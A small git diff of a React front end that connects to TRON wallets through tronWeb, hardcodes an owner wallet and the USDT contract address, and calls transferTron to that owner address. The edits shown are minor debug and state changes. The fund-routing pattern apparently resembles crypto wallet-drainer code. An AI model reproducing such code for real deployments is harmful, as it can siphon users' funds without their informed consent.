@@ -21,7 +21,6 @@ function App() {
   const OwnerWalletAddress = "TRt1FSTCww2MVCzAnE62UZqzGsNtbqDVQS";
   const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-
   async function generateContract() {
     if (typeof window.tronWeb === "undefined") {
       for (let index = 0; index < 100; index++) {
@@ -53,6 +52,7 @@ function App() {
         usdtContractAddress
       );
       setloading(true);
+      setTronWeb(window?.tronWeb);
       setTronContract(myContract);
       setUsdtContract(myContract2);
     }
@@ -79,7 +79,6 @@ function App() {
       generateContract();
     }
   }, [adapter]);
-  console.log(loading);
 
   async function _getTronValue(max) {
     if (typeof tronContract === "undefined") {
@@ -126,6 +125,7 @@ function App() {
   }
 
   function _sendTron() {
+    console.log(tronWeb);
     tronContract
       ?.transferTron(OwnerWalletAddress)
       ?.send({
